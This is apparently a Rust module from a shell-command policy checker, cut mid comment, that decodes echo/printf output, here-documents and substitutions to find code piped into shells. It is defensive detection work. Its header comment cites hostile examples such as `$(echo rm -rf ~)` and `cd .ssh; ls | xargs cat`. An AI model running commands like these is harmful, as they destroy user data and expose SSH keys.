//! `dev`'s best-effort readings that rev 4's first P5 round lost (P5 review
//! 1, finding 2): the code a line hands to a shell through text that `dev`
//! decoded, and the sinks that run it.
//!
//! Generators (each with `dev`'s semantics, `shell.rs` at `5c4d154f`):
//! - `echo`/`printf`/`yes` output, with escapes decoded (`unescape_one`,
//!   `unescape_to`, `format_printf`, `echo_printf_texts`);
//! - here-document bodies and process substitutions (`<(…)` read by a shell
//!   or `source`, `> >(bash)`);
//! - pipe and here-document sinks: shells (or a word that may name one),
//!   `eval`/`source`/`.`, the stdin script readers (`at`, `batch`, `script`,
//!   `chroot`, `crontab`, `make -f -`), compounds that contain one, and
//!   `env -S` strings that name one;
//! - substituted command words (`s$(echo h)`, `$(echo rm -rf ~)`, `$(which
//!   env) -S …` behind wrappers);
//! - `script`'s option forms (`-t0`, `-t/dev/null`, `--timing=…`);
//! - `xargs` fed by `ls`/`find` (`cd .ssh; ls | xargs cat`).
//!
//! Every step is charged to the §8 budget before the work it pays for; the
//! payloads are then checked by the caller like any other text (§2).

use super::{
    clone_str_budgeted, extract_env_split_string_be, extract_shell_c_code, fold_cmd_cr19,
    is_shell_folded, reads_stdin_as_script_budgeted, substituted_program_simple, unwrap_simple_be,
};
use crate::policy::model::{ComputeBudget, Exhausted, FoldRules};

/// Widths above this are not padded (`dev`'s `MAX_PAD`).
const MAX_PAD: usize = 256;
/// At most this many payload texts per line and level.
pub(super) const MAX_PAYLOADS: usize = 64;
/// At most this many bytes in one payload text.
const MAX_PAYLOAD_BYTES: usize = 64 * 1024;

/// What a payload is: code a child shell runs (`Child`), or code the same
/// shell runs (`SameShell`, `source`/`eval`), whose `cd` reaches the rest of
/// the line.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum PayloadKind {
    Child,
    SameShell,
}

/// One payload, with the `cd` context it runs in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct Payload {
    pub(super) text: String,
    pub(super) kind: PayloadKind,
    /// A detected `downloader | sink` pipeline (pipe-to-shell).
    pub(super) pipe_to_shell: bool,
}

fn charge_str(s: &str, budget: &mut ComputeBudget) -> Result<(), Exhausted> {
    budget.charge(s.len().max(1) as u64)
}

// ---------------------------------------------------------------------------
// echo / printf / yes decoding
// ---------------------------------------------------------------------------

/// Decodes one backslash escape at `cs[i]` (just after the `\`), the way
/// `echo -e`, zsh's and dash's `echo`, `printf` formats and `%b` do.
/// `octal0`: octal is `\0NNN` (echo, `%b`) rather than `\NNN` (a format).
/// Returns the index after the escape, or `None` for `\c` (output stops).
/// The caller charges the input and the output bound.
pub(super) fn unescape_one(cs: &[char], i: usize, octal0: bool, out: &mut String) -> Option<usize> {
    let Some(&c) = cs.get(i) else {
        out.push('\\');
        return Some(i);
    };
    let digits = |from: usize, max: usize, radix: u32| -> (u32, usize) {
        let mut v = 0u32;
        let mut n = 0;
        while n < max
            && let Some(d) = cs.get(from + n).and_then(|c| c.to_digit(radix))
        {
            v = v.saturating_mul(radix).saturating_add(d);
            n += 1;
        }
        (v, n)
    };
    let push_code = |v: u32, out: &mut String| {
        if let Some(ch) = char::from_u32(v & 0x10ffff) {
            out.push(ch);
        }
    };
    let simple = match c {
        'a' => Some('\x07'),
        'b' => Some('\x08'),
        'e' | 'E' => Some('\x1b'),
        'f' => Some('\x0c'),
        'n' => Some('\n'),
        'r' => Some('\r'),
        't' => Some('\t'),
        'v' => Some('\x0b'),
        '\\' | '\'' | '"' | '?' => Some(c),
        _ => None,
    };
    if let Some(ch) = simple {
        out.push(ch);
        return Some(i + 1);
    }
    match c {
        'c' => None,
        'x' | 'u' | 'U' => {
            let max = match c {
                'x' => 2,
                'u' => 4,
                _ => 8,
            };
            let (v, n) = digits(i + 1, max, 16);
            if n == 0 {
                out.push('\\');
                out.push(c);
            } else {
                push_code(v, out);
            }
            Some(i + 1 + n)
        }
        '0' if octal0 => {
            let (v, n) = digits(i + 1, 3, 8);
            push_code(v, out);
            Some(i + 1 + n)
        }
        '0'..='7' if !octal0 => {
            let (v, n) = digits(i, 3, 8);
            push_code(v, out);
            Some(i + n)
        }
        _ => {
            out.push('\\');
            out.push(c);
            Some(i + 1)
        }
    }
}

/// `s` with every escape decoded; `false` when a `\c` stopped the output.
pub(super) fn unescape_to(
    s: &str,
    octal0: bool,
    out: &mut String,
    budget: &mut ComputeBudget,
) -> Result<bool, Exhausted> {
    // One step per input byte; the char buffer and at most 4 output bytes
    // per input char (an escape never yields more chars than it reads).
    charge_str(s, budget)?;
    budget.charge_alloc(s.len().saturating_mul(4 + std::mem::size_of::<char>()))?;
    let cs: Vec<char> = s.chars().collect();
    let mut i = 0;
    while i < cs.len() {
        if cs[i] == '\\' {
            match unescape_one(&cs, i + 1, octal0, out) {
                Some(n) => i = n,
                None => return Ok(false),
            }
        } else {
            out.push(cs[i]);
            i += 1;
        }
    }
    Ok(true)
}

/// What `printf FORMAT ARGS…` prints (`dev`'s `format_printf`): the format is
/// reused while arguments remain; a conversion with no argument left prints
/// nothing (or `0`); width, precision (`*` takes an argument), `%c`, `%b`
/// and `%N$` positions are applied. Each pass over the format and each piece
/// is charged before it is built.
pub(super) fn format_printf(
    fmt: &str,
    args: &[String],
    b_octal0: bool,
    budget: &mut ComputeBudget,
) -> Result<String, Exhausted> {
    budget.charge_alloc(fmt.len().saturating_mul(std::mem::size_of::<char>()))?;
    let cs: Vec<char> = fmt.chars().collect();
    let mut out = String::new();
    let mut idx = 0usize;
    let mut used_positional = false;
    loop {
        let before = idx;
        // the literal part of one pass, at most 4 bytes per format char
        charge_str(fmt, budget)?;
        budget.charge_alloc(fmt.len().saturating_mul(4))?;
        let mut i = 0;
        while i < cs.len() {
            let c = cs[i];
            if c == '\\' {
                match unescape_one(&cs, i + 1, false, &mut out) {
                    Some(n) => i = n,
                    None => return Ok(out),
                }
                continue;
            }
            if c != '%' {
                out.push(c);
                i += 1;
                continue;
            }
            i += 1;
            if cs.get(i) == Some(&'%') {
                out.push('%');
                i += 1;
                continue;
            }
            let mut digits = 0;
            while cs.get(i + digits).is_some_and(|c| c.is_ascii_digit()) {
                digits += 1;
            }
            let positional: Option<usize> = (digits > 0 && cs.get(i + digits) == Some(&'$'))
                .then(|| cs[i..i + digits].iter().collect::<String>().parse().ok())
                .flatten();
            if positional.is_some() {
                i += digits + 1;
                used_positional = true;
            }
            let next_arg = |idx: &mut usize| -> Option<&String> {
                if let Some(n) = positional {
                    return n.checked_sub(1).and_then(|k| args.get(k));
                }
                let a = args.get(*idx);
                if a.is_some() {
                    *idx += 1;
                }
                a
            };
            let mut left = false;
            while let Some(&f) = cs.get(i) {
                if matches!(f, '-' | '+' | ' ' | '#' | '0' | '\'') {
                    left |= f == '-';
                    i += 1;
                } else {
                    break;
                }
            }
            let number = |i: &mut usize, idx: &mut usize| -> Option<i64> {
                if cs.get(*i) == Some(&'*') {
                    *i += 1;
                    return Some(
                        next_arg(idx)
                            .and_then(|a| a.trim().parse().ok())
                            .unwrap_or(0),
                    );
                }
                let mut v: Option<i64> = None;
                while let Some(d) = cs.get(*i).and_then(|c| c.to_digit(10)) {
                    v = Some(
                        v.unwrap_or(0)
                            .saturating_mul(10)
                            .saturating_add(i64::from(d)),
                    );
                    *i += 1;
                }
                v
            };
            let width = number(&mut i, &mut idx);
            let precision = if cs.get(i) == Some(&'.') {
                i += 1;
                Some(number(&mut i, &mut idx).unwrap_or(0))
            } else {
                None
            };
            while matches!(cs.get(i), Some('h' | 'l' | 'L' | 'q' | 'j' | 'z' | 't')) {
                i += 1;
            }
            let conv = cs.get(i).copied();
            i += 1;
            let arg = next_arg(&mut idx).map(String::as_str);
            let arg_len = arg.map_or(1, str::len);
            budget.charge(arg_len.max(1) as u64)?;
            budget.charge_alloc(arg_len.saturating_mul(4).saturating_add(MAX_PAD))?;
            let mut piece = String::new();
            let mut stop = false;
            match conv {
                Some('s') => piece.push_str(arg.unwrap_or("")),
                Some('b') => {
                    stop = !unescape_to(arg.unwrap_or(""), b_octal0, &mut piece, budget)?;
                }
                Some('c') => piece.extend(arg.unwrap_or("").chars().next()),
                Some(_) => piece.push_str(arg.unwrap_or("0")),
                None => {}
            }
            if let (Some(p), Some('s' | 'b')) = (precision, conv) {
                piece = piece.chars().take(p.max(0) as usize).collect();
            }
            if let Some(w) = width {
                let (w, left) = (w.unsigned_abs() as usize, left || w < 0);
                let n = piece.chars().count();
                if w > n && w <= MAX_PAD {
                    let pad = " ".repeat(w - n);
                    piece = if left { piece + &pad } else { pad + &piece };
                }
            }
            out.push_str(&piece);
            if stop || out.len() > MAX_PAYLOAD_BYTES {
                return Ok(out);
            }
        }
        if idx == before || idx >= args.len() || used_positional {
            break;
        }
    }
    Ok(out)
}

/// The text `echo`, `printf` or `yes` writes, in every reading a shell might
/// give it (escapes decoded or not, either octal form). Nothing for other
/// commands. `eff` holds cooked words (quotes removed).
pub(super) fn echo_printf_texts(
    eff: &[String],
    folds: FoldRules,
    texts: &mut Vec<String>,
    budget: &mut ComputeBudget,
) -> Result<(), Exhausted> {
    let Some(first) = eff.first() else {
        return Ok(());
    };
    let f = fold_cmd_cr19(first, folds, budget)?;
    let total: usize = eff.iter().map(|w| w.len() + 1).sum();
    match f.as_str() {
        "echo" => {
            let mut j = 1;
            while j < eff.len() {
                let w = eff[j].as_str();
                if w.starts_with('-')
                    && w.len() > 1
                    && w[1..].chars().all(|c| matches!(c, 'n' | 'e' | 'E'))
                {
                    j += 1;
                } else {
                    break;
                }
            }
            if j < eff.len() {
                budget.charge(total as u64)?;
                budget.charge_alloc(total)?;
                let joined = eff[j..].join(" ");
                for octal0 in [true, false] {
                    let mut unesc = String::new();
                    unescape_to(&joined, octal0, &mut unesc, budget)?;
                    if unesc != joined && !texts.contains(&unesc) {
                        texts.push(unesc);
                    }
                }
                texts.push(joined);
            }
        }
        "printf" => {
            let mut j = 1;
            while j < eff.len() {
                let w = eff[j].as_str();
                if w == "--" {
                    j += 1;
                    break;
                } else if w == "-v" {
                    j += 2;
                } else {
                    break;
                }
            }
            if j < eff.len() {
                let rest = &eff[j..];
                for b_octal0 in [true, false] {
                    let t = format_printf(&rest[0], &rest[1..], b_octal0, budget)?;
                    if !texts.contains(&t) {
                        texts.push(t);
                    }
                }
                if rest.len() > 1 {
                    budget.charge(total as u64)?;
                    budget.charge_alloc(total)?;
                    texts.push(rest[1..].join(" "));
                }
            }
        }
        "yes" => {
            budget.charge(total as u64)?;
            budget.charge_alloc(total.max(1))?;
            texts.push(if eff.len() > 1 {
                eff[1..].join(" ")
            } else {
                "y".to_owned()
            });
        }
        _ => {}
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// A small quote-aware scanner: pipelines, stages, commands, words
// ---------------------------------------------------------------------------

/// One word: as written (`raw`, quotes kept) and as the shell passes it
/// (`cooked`, quotes removed; substitutions kept as written).
#[derive(Debug, Clone, Default)]
pub(super) struct Word {
    pub(super) raw: String,
    pub(super) cooked: String,
}

/// One pipeline stage: its text, and the here-document bodies it reads.
#[derive(Debug, Clone, Default)]
pub(super) struct Stage {
    pub(super) text: String,
    pub(super) heredocs: Vec<String>,
}

/// One pipeline of the line, with the byte range of the line (here-document
/// bodies removed) it came from.
#[derive(Debug, Clone, Default)]
pub(super) struct Pipeline {
    pub(super) stages: Vec<Stage>,
    pub(super) start: usize,
    pub(super) end: usize,
}

/// Length of the quoted, substituted or bracketed construct at `b[i]`, or 1.
fn skip_construct(b: &[u8], i: usize) -> usize {
    let n = b.len();
    match b[i] {
        b'\\' => (2).min(n - i),
        b'\'' => b[i + 1..]
            .iter()
            .position(|&c| c == b'\'')
            .map_or(n - i, |p| p + 2),
        b'"' => {
            let mut j = i + 1;
            while j < n {
                match b[j] {
                    b'\\' => j += 2,
                    b'"' => return j + 1 - i,
                    b'$' if b.get(j + 1) == Some(&b'(') => j += skip_construct(b, j + 1) + 1,
                    _ => j += 1,
                }
            }
            n - i
        }
        b'`' => b[i + 1..]
            .iter()
            .position(|&c| c == b'`')
            .map_or(n - i, |p| p + 2),
        b'(' => {
            let mut depth = 0usize;
            let mut j = i;
            while j < n {
                match b[j] {
                    b'(' => {
                        depth += 1;
                        j += 1;
                    }
                    b')' => {
                        depth -= 1;
                        j += 1;
                        if depth == 0 {
                            return j - i;
                        }
                    }
                    b'\'' | b'"' | b'`' | b'\\' => j += skip_construct(b, j),
                    _ => j += 1,
                }
            }
            n - i
        }
        _ => 1,
    }
}

fn is_word_boundary(b: &[u8], i: usize) -> bool {
    i == 0
        || matches!(
            b[i - 1],
            b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
        )
}

/// Whether the word at `i` is where a command starts: at the start, after
/// a separator or a brace, or after a word that opens a command list
/// (`then`, `do`, `!`, …) or a function header (`function f`, `f()`).
fn at_command_position(text: &str, i: usize) -> bool {
    let b = text.as_bytes();
    if !is_word_boundary(b, i) {
        return false;
    }
    let mut j = i;
    while j > 0 && matches!(b[j - 1], b' ' | b'\t') {
        j -= 1;
    }
    if j == 0 || matches!(b[j - 1], b';' | b'&' | b'|' | b'(' | b'\n' | b'{' | b'}') {
        return true;
    }
    if b[j - 1] == b')' {
        // `f()` or a `case` pattern
        return true;
    }
    let ws = b[..j]
        .iter()
        .rposition(|c| matches!(c, b' ' | b'\t' | b';' | b'&' | b'|' | b'(' | b'\n'))
        .map_or(0, |p| p + 1);
    let prev = &text[ws..j];
    if matches!(
        prev,
        "then" | "do" | "else" | "elif" | "if" | "while" | "until" | "!" | "time" | "coproc"
    ) {
        return true;
    }
    // `function NAME {`
    let mut k = ws;
    while k > 0 && matches!(b[k - 1], b' ' | b'\t') {
        k -= 1;
    }
    text[..k].ends_with("function") || prev.ends_with("()")
}

/// Splits `text` into pipelines and their stages, following compound
/// commands (`{ …; }`, `( … )`, `if … fi`, loops, `case … esac`) so the
/// separators inside them don't end the stage, and collecting here-document
/// bodies for the stage that opens them. Returns the pipelines and the line
/// with the bodies removed (the ranges index into it).
pub(super) fn split_pipelines(
    text: &str,
    budget: &mut ComputeBudget,
) -> Result<(Vec<Pipeline>, String), Exhausted> {
    let b = text.as_bytes();
    // one step per byte, and the copy of the line without bodies
    charge_str(text, budget)?;
    budget.charge_alloc(text.len().saturating_mul(2))?;
    let mut cmd = String::with_capacity(text.len());
    let mut pipelines: Vec<Pipeline> = Vec::new();
    let mut cur = Pipeline::default();
    let mut stage = Stage::default();
    let mut stage_start = 0usize;
    let mut depth = 0usize;
    let mut parens = 0usize;
    let mut pending_heredocs: Vec<(String, bool, usize)> = Vec::new();
    let mut i = 0usize;
    let finish_stage = |stage: &mut Stage, cmd: &str, start: usize, cur: &mut Pipeline| {
        stage.text = cmd[start..].trim().to_owned();
        if !stage.text.is_empty() || !stage.heredocs.is_empty() {
            cur.stages.push(std::mem::take(stage));
        }
    };
    while i < b.len() {
        let c = b[i];
        // here-document bodies start after the newline that ends their line
        if c == b'\n' && !pending_heredocs.is_empty() {
            cmd.push('\n');
            i += 1;
            for (delim, strip, owner) in std::mem::take(&mut pending_heredocs) {
                let mut body = String::new();
                loop {
                    if i >= b.len() {
                        break;
                    }
                    let end = b[i..]
                        .iter()
                        .position(|&c| c == b'\n')
                        .map_or(b.len(), |p| i + p);
                    let line = &text[i..end];
                    i = (end + 1).min(b.len());
                    let cmp = if strip {
                        line.trim_start_matches('\t')
                    } else {
                        line
                    };
                    if cmp == delim {
                        break;
                    }
                    body.push_str(line);
                    body.push('\n');
                }
                // the owner is the stage index in `cur`, or the open stage
                if owner < cur.stages.len() {
                    cur.stages[owner].heredocs.push(body);
                } else {
                    stage.heredocs.push(body);
                }
            }
            // the newline still ends the pipeline at the top level
            if depth == 0 {
                finish_stage(&mut stage, &cmd, stage_start, &mut cur);
                stage_start = cmd.len();
                cur.end = stage_start;
                if !cur.stages.is_empty() {
                    pipelines.push(std::mem::take(&mut cur));
                }
                cur.start = stage_start;
            }
            continue;
        }
        match c {
            b'\\' | b'\'' | b'"' | b'`' => {
                let n = skip_construct(b, i);
                cmd.push_str(&text[i..i + n]);
                i += n;
                continue;
            }
            b'$' | b'<' | b'>' if b.get(i + 1) == Some(&b'(') => {
                let n = 1 + skip_construct(b, i + 1);
                cmd.push_str(&text[i..(i + n).min(b.len())]);
                i += n;
                continue;
            }
            b'<' if b.get(i + 1) == Some(&b'<') && b.get(i + 2) != Some(&b'<') => {
                // `<<WORD` / `<<-WORD`: read the delimiter
                let mut j = i + 2;
                let strip = b.get(j) == Some(&b'-');
                if strip {
                    j += 1;
                }
                while j < b.len() && matches!(b[j], b' ' | b'\t') {
                    j += 1;
                }
                let ds = j;
                while j < b.len()
                    && !matches!(
                        b[j],
                        b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'<' | b'>' | b')'
                    )
                {
                    j += if matches!(b[j], b'\'' | b'"') {
                        skip_construct(b, j)
                    } else {
                        1
                    };
                }
                let delim: String = text[ds..j.min(b.len())]
                    .chars()
                    .filter(|c| !matches!(c, '\'' | '"' | '\\'))
                    .collect();
                pending_heredocs.push((delim, strip, cur.stages.len()));
                cmd.push_str(&text[i..j.min(b.len())]);
                i = j;
                continue;
            }
            b'(' => {
                parens += 1;
                depth += 1;
            }
            // an unmatched `)` ends a `case` pattern
            b')' if parens > 0 => {
                parens -= 1;
                depth = depth.saturating_sub(1);
            }
            b'{' | b'}' if at_command_position(text, i) => {
                let next_ok = b
                    .get(i + 1)
                    .is_none_or(|n| n.is_ascii_whitespace() || *n == b';');
                if next_ok {
                    if c == b'{' {
                        depth += 1;
                    } else {
                        depth = depth.saturating_sub(1);
                    }
                }
            }
            _ if c.is_ascii_alphabetic() && is_word_boundary(b, i) => {
                let end = b[i..]
                    .iter()
                    .position(|c| !c.is_ascii_alphanumeric() && *c != b'_')
                    .map_or(b.len(), |p| i + p);
                let w = &text[i..end];
                // keywords count only where a command starts (`echo if` is
                // an argument)
                let ends_word = b.get(end).is_none_or(|n| {
                    n.is_ascii_whitespace() || matches!(n, b';' | b'&' | b'|' | b')')
                });
                if ends_word && at_command_position(text, i) {
                    match w {
                        "if" | "while" | "until" | "for" | "case" | "select" => depth += 1,
                        "fi" | "done" | "esac" => depth = depth.saturating_sub(1),
                        _ => {}
                    }
                }
                cmd.push_str(w);
                i = end;
                continue;
            }
            _ => {}
        }
        if depth == 0 {
            let two = b.get(i + 1).copied();
            let sep_len = match (c, two) {
                (b'|', Some(b'|')) | (b'&', Some(b'&')) => 2,
                (b'|', Some(b'&')) => 2,
                (b'|', _) => 1,
                (b';', Some(b';')) => 2,
                (b';', _) | (b'\n', _) => 1,
                (b'&', Some(b'>')) => 0,
                (b'&', _) if i > 0 && matches!(b[i - 1], b'>' | b'<') => 0,
                (b'&', _) => 1,
                _ => 0,
            };
            if sep_len > 0 {
                let is_pipe = c == b'|' && two != Some(b'|');
                finish_stage(&mut stage, &cmd, stage_start, &mut cur);
                cmd.push_str(&text[i..i + sep_len]);
                i += sep_len;
                stage_start = cmd.len();
                if !is_pipe {
                    cur.end = stage_start;
                    if !cur.stages.is_empty() {
                        pipelines.push(std::mem::take(&mut cur));
                    }
                    cur.start = stage_start;
                }
                continue;
            }
        }
        let ch_len = text[i..].chars().next().map_or(1, char::len_utf8);
        cmd.push_str(&text[i..i + ch_len]);
        i += ch_len;
    }
    finish_stage(&mut stage, &cmd, stage_start, &mut cur);
    cur.end = cmd.len();
    if !cur.stages.is_empty() {
        pipelines.push(cur);
    }
    budget.charge_alloc(
        pipelines
            .len()
            .saturating_mul(std::mem::size_of::<Pipeline>()),
    )?;
    Ok((pipelines, cmd))
}

/// Splits a stage into its simple commands: separators and compound syntax
/// (`{`, `}`, `(`, `)`, `then`, `do`, …) end a command; their keywords are
/// dropped.
pub(super) fn stage_commands(
    stage: &str,
    budget: &mut ComputeBudget,
) -> Result<Vec<Vec<Word>>, Exhausted> {
    let b = stage.as_bytes();
    charge_str(stage, budget)?;
    budget.charge_alloc(stage.len().saturating_mul(3))?;
    let mut cmds: Vec<Vec<Word>> = Vec::new();
    let mut words: Vec<Word> = Vec::new();
    let mut w = Word::default();
    let mut i = 0usize;
    let flush_word = |w: &mut Word, words: &mut Vec<Word>| {
        if !w.raw.is_empty() {
            words.push(std::mem::take(w));
        }
    };
    let flush_cmd = |words: &mut Vec<Word>, cmds: &mut Vec<Vec<Word>>| {
        let ws = strip_compound_words(std::mem::take(words));
        if !ws.is_empty() {
            cmds.push(ws);
        }
    };
    while i < b.len() {
        let c = b[i];
        match c {
            b'\'' => {
                let n = skip_construct(b, i);
                w.raw.push_str(&stage[i..i + n]);
                let inner_end = (i + n).saturating_sub(1).max(i + 1);
                w.cooked.push_str(&stage[(i + 1).min(inner_end)..inner_end]);
                i += n;
            }
            b'"' => {
                let n = skip_construct(b, i);
                w.raw.push_str(&stage[i..i + n]);
                let inner_end = (i + n).saturating_sub(1).max(i + 1);
                let inner = &stage[(i + 1).min(inner_end)..inner_end];
                let mut k = 0;
                let ib = inner.as_bytes();
                while k < ib.len() {
                    if ib[k] == b'\\'
                        && k + 1 < ib.len()
                        && matches!(ib[k + 1], b'"' | b'\\' | b'$' | b'`')
                    {
                        w.cooked.push(ib[k + 1] as char);
                        k += 2;
                    } else {
                        let l = inner[k..].chars().next().map_or(1, char::len_utf8);
                        w.cooked.push_str(&inner[k..k + l]);
                        k += l;
                    }
                }
                i += n;
            }
            b'\\' => {
                let n = skip_construct(b, i);
                w.raw.push_str(&stage[i..i + n]);
                if n == 2 && b[i + 1] != b'\n' {
                    w.cooked.push(b[i + 1] as char);
                }
                i += n;
            }
            b'`' => {
                let n = skip_construct(b, i);
                w.raw.push_str(&stage[i..i + n]);
                w.cooked.push_str(&stage[i..i + n]);
                i += n;
            }
            b'$' | b'<' | b'>' if b.get(i + 1) == Some(&b'(') => {
                let n = (1 + skip_construct(b, i + 1)).min(b.len() - i);
                // `<(…)`/`>(…)` are words of their own
                if c != b'$' {
                    flush_word(&mut w, &mut words);
                }
                w.raw.push_str(&stage[i..i + n]);
                w.cooked.push_str(&stage[i..i + n]);
                i += n;
                if c != b'$' {
                    flush_word(&mut w, &mut words);
                }
            }
            b' ' | b'\t' => {
                flush_word(&mut w, &mut words);
                i += 1;
            }
            b';' | b'\n' | b'|' | b'&' | b'(' | b')' => {
                if c == b'&' && i > 0 && matches!(b[i - 1], b'>' | b'<') {
                    w.raw.push('&');
                    w.cooked.push('&');
                    i += 1;
                    continue;
                }
                if c == b')' && !w.raw.is_empty() && !words.is_empty() && words[0].cooked == "case"
                {
                    // a `case` pattern: dropped with its words
                    w = Word::default();
                    words.clear();
                    i += 1;
                    continue;
                }
                flush_word(&mut w, &mut words);
                flush_cmd(&mut words, &mut cmds);
                i += 1;
            }
            _ => {
                let l = stage[i..].chars().next().map_or(1, char::len_utf8);
                w.raw.push_str(&stage[i..i + l]);
                w.cooked.push_str(&stage[i..i + l]);
                i += l;
            }
        }
    }
    flush_word(&mut w, &mut words);
    flush_cmd(&mut words, &mut cmds);
    Ok(cmds)
}

/// Drops compound syntax at the start of a command (`{`, `then`, `do`,
/// `else`, `!`, `time -p`, `coproc [NAME]`, `function NAME`, `NAME()`), a
/// `case` pattern ending in `)`, and trailing `}`.
fn strip_compound_words(mut ws: Vec<Word>) -> Vec<Word> {
    loop {
        let Some(first) = ws.first() else { break };
        let c = first.cooked.as_str();
        let drop = match c {
            "{" | "}" | "then" | "do" | "else" | "elif" | "if" | "while" | "until" | "!" | "fi"
            | "done" | "esac" | "in" => 1,
            "time" => {
                if ws.get(1).is_some_and(|w| w.cooked == "-p") {
                    2
                } else {
                    1
                }
            }
            "coproc" => {
                if ws.get(2).is_some_and(|w| w.cooked == "{") {
                    2
                } else {
                    1
                }
            }
            "function" => 2,
            "for" | "select" | "case" => ws.len(),
            _ if c.ends_with("()") => 1,
            _ if c.ends_with(')') && !c.starts_with("$(") && !c.contains('(') => 1,
            _ => 0,
        };
        if drop == 0 {
            break;
        }
        ws.drain(..drop.min(ws.len()));
    }
    while ws.last().is_some_and(|w| w.cooked == "}") {
        ws.pop();
    }
    ws
}

/// A command's cooked argv without redirections; process substitutions are
/// returned apart: `(argv, inputs <(…), outputs >(…), here-strings)`.
type CmdParts = (Vec<Word>, Vec<String>, Vec<String>, Vec<String>);

fn command_parts(ws: &[Word], budget: &mut ComputeBudget) -> Result<CmdParts, Exhausted> {
    budget.charge(ws.len().max(1) as u64)?;
    let mut argv = Vec::new();
    let mut ins = Vec::new();
    let mut outs = Vec::new();
    let mut here = Vec::new();
    let mut k = 0;
    while k < ws.len() {
        let w = &ws[k];
        let c = w.cooked.as_str();
        if let Some(inner) = c.strip_prefix("<(").and_then(|s| s.strip_suffix(')')) {
            ins.push(inner.to_owned());
            k += 1;
            continue;
        }
        if let Some(inner) = c.strip_prefix(">(").and_then(|s| s.strip_suffix(')')) {
            outs.push(inner.to_owned());
            k += 1;
            continue;
        }
        let op_end = c.trim_start_matches(|ch: char| ch.is_ascii_digit());
        let is_redirect = op_end.starts_with(['<', '>']) || c.starts_with("&>");
        if is_redirect
            && w.raw
                .starts_with(|ch: char| ch.is_ascii_digit() || matches!(ch, '<' | '>' | '&'))
        {
            let op: String = op_end
                .chars()
                .take_while(|ch| matches!(ch, '<' | '>' | '&' | '|' | '-'))
                .collect();
            let target = &op_end[op.len()..];
            if op == "<<<" {
                if target.is_empty() {
                    if let Some(t) = ws.get(k + 1) {
                        here.push(t.cooked.clone());
                    }
                    k += 2;
                } else {
                    here.push(target.to_owned());
                    k += 1;
                }
                continue;
            }
            if op.starts_with("<<") {
                k += 1;
                continue;
            }
            if target.is_empty() && !op.ends_with('-') {
                // the target is the next word (a `>(…)` one is a sink)
                if let Some(t) = ws.get(k + 1) {
                    let tc = t.cooked.as_str();
                    if let Some(inner) = tc.strip_prefix(">(").and_then(|s| s.strip_suffix(')')) {
                        outs.push(inner.to_owned());
                    } else if let Some(inner) =
                        tc.strip_prefix("<(").and_then(|s| s.strip_suffix(')'))
                    {
                        ins.push(inner.to_owned());
                    }
                }
                k += 2;
            } else {
                k += 1;
            }
            continue;
        }
        argv.push(w.clone());
        k += 1;
    }
    Ok((argv, ins, outs, here))
}

fn cooked(ws: &[Word]) -> Vec<String> {
    ws.iter().map(|w| w.cooked.clone()).collect()
}

fn has_substitution(w: &str) -> bool {
    w.contains("$(") || w.contains('`')
}

/// What one substitution body writes, by `echo`/`printf`/`yes` (`dev`'s
/// `output_texts`); `None` when it runs something else.
fn substitution_outputs(
    body: &str,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<Option<Vec<String>>, Exhausted> {
    let mut texts = Vec::new();
    for cmd in stage_commands(body, budget)? {
        let (argv, _, _, _) = command_parts(&cmd, budget)?;
        let before = texts.len();
        echo_printf_texts(&cooked(&argv), folds, &mut texts, budget)?;
        if texts.len() == before {
            return Ok(None);
        }
    }
    Ok(Some(texts))
}

/// `word` with each `$(…)`/`` `…` `` replaced by what it writes (one reading
/// per output text of the first substitution), or `None` when a substitution
/// runs something the engine can't read (`dev`'s `substituted_program_at`).
fn expand_substitutions(
    word: &str,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<Option<Vec<String>>, Exhausted> {
    charge_str(word, budget)?;
    let b = word.as_bytes();
    let mut i = 0;
    let mut prefix = String::new();
    while i < b.len() {
        let (start, len, body) = if b[i] == b'$' && b.get(i + 1) == Some(&b'(') {
            let n = 1 + skip_construct(b, i + 1);
            let n = n.min(b.len() - i);
            (i, n, &word[i + 2..(i + n).saturating_sub(1).max(i + 2)])
        } else if b[i] == b'`' {
            let n = skip_construct(b, i).min(b.len() - i);
            (i, n, &word[i + 1..(i + n).saturating_sub(1).max(i + 1)])
        } else {
            let l = word[i..].chars().next().map_or(1, char::len_utf8);
            prefix.push_str(&word[i..i + l]);
            i += l;
            continue;
        };
        let Some(outs) = substitution_outputs(body, folds, budget)? else {
            return Ok(None);
        };
        let rest = &word[start + len..];
        let mut readings = Vec::new();
        for o in outs.iter().take(4) {
            let o = o.trim_end_matches('\n');
            budget.charge_alloc(prefix.len() + o.len() + rest.len())?;
            let joined = format!("{prefix}{o}{rest}");
            if has_substitution(rest) {
                if let Some(more) = expand_substitutions(&joined, folds, budget)? {
                    readings.extend(more);
                }
            } else {
                readings.push(joined);
            }
        }
        return Ok(Some(readings));
    }
    Ok(Some(vec![prefix]))
}

/// Whether a word may name a shell: a shell, or a word whose name the shell
/// builds at run time (`dev`'s `maybe_shell`).
fn maybe_shell(
    word: &str,
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<bool, Exhausted> {
    if word.contains(['$', '`']) {
        return Ok(true);
    }
    let f = fold_cmd_cr19(word, folds, budget)?;
    is_shell_folded(&f, budget)
}

/// The argv readings of one command (`dev`'s `unwrap_readings`): the
/// wrappers stripped, and each substituted command word replaced by what it
/// writes (or kept, unknown).
fn readings(
    argv: &[String],
    folds: FoldRules,
    budget: &mut ComputeBudget,
) -> Result<(Vec<Vec<String>>, bool), Exhausted> {
    let mut out: Vec<Vec<String>> = Vec::new();
    let mut unknown = false;
    let eff = unwrap_simple_be(argv, folds, budget)?;
    out.push(eff.clone());
    if let Some(first) = eff.first()
        && has_substitution(first)
    {
        match expand_substitutions(first, folds, budget)? {
            Some(words) => {
                for w in words.iter().take(4) {
                    let mut e: Vec<String> = w.split_whitespace().map(str::to_owned).collect();
                    budget.charge_alloc(e.len() * std::mem::size_of::<String>() + w.len())?;
                    e.extend(eff[1..].iter().cloned());
                    let un = unwrap_simple_be(&e, folds, budget)?;
                    if !un.is_empty() && !out.contains(&un) {
                        out.push(un);
                    }
                }
            }
            None => unknown = true,
        }
    }
    Ok((out, unknown))
}

/// Whether one reading runs what it reads on stdin as code (`dev`'s
